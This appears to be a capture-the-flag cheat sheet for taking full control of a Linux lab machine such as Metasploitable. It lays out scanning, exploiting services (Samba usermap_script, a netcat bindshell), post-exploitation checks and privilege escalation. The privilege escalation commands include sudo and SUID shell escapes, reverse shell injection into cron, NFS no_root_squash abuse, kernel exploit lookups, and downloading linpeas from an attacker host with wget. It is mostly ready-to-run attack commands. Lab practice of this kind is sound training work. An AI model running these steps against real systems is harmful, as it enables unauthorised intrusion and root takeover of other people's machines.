# 🐧 LINUX FULL PWN: Scan → Exploit → PrivEsc → Root

---

## PHASE 1: RECON (5 min)
```bash
nmap -sV -sC -p- -T4 <IP>
```

## PHASE 2: EXPLOIT (pick based on open service)
```
Port 21 → FTP anon / vsftpd backdoor
Port 22 → SSH brute / key reuse
Port 80 → Web vuln (SQLi, RCE, LFI)
Port 445 → Samba exploit (usermap_script)
Port 1524 → Bindshell (nc <IP> 1524)
Port 6667 → UnrealIRCd backdoor
```
```bash
# Samba usermap_script (Metasploitable)
use exploit/multi/samba/usermap_script
set RHOSTS <IP>
run
```

## PHASE 3: POST-EXPLOIT (user shell mila)
```bash
whoami && id
uname -a                                   # kernel version
cat /etc/issue                             # OS version
```

## PHASE 4: PRIVILEGE ESCALATION

### Check 1: sudo
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/vi → sudo vi → :!bash → root
# (ALL) NOPASSWD: /usr/bin/python → sudo python -c 'import os;os.system("/bin/bash")'
# (ALL) NOPASSWD: ALL → sudo su
```

### Check 2: SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/find → find . -exec /bin/bash -p \;
# /usr/bin/vim → vim -c ':!bash'
# /usr/bin/nmap (old) → nmap --interactive → !bash
```

### Check 3: Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.d/
# Writable script in cron? → inject reverse shell
```

### Check 4: NFS no_root_squash
```bash
cat /etc/exports
# no_root_squash → mount → create SUID binary → root
```

### Check 5: Kernel Exploit
```bash
uname -r                                   # kernel version
searchsploit linux kernel <version>
# DirtyCow, PwnKit, etc.
```

### Check 6: LinPEAS (automated)
```bash
# Upload linpeas
wget http://YOUR_IP:8888/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

## PHASE 5: FLAG
```bash
cat /root/flag.txt
find / -name "flag*" 2>/dev/null
```

---

## QUICK DECISION:
```
Linux box
  ├─ nmap → find open service → exploit → get shell
  ├─ Shell mila → sudo -l (FIRST THING)
  ├─ sudo available? → GTFOBins lookup
  ├─ No sudo? → SUID binaries → find -perm -4000
  ├─ No SUID? → cron jobs → writable scripts?
  ├─ Nothing? → kernel version → searchsploit
  └─ Root mila → cat /root/flag.txt
```
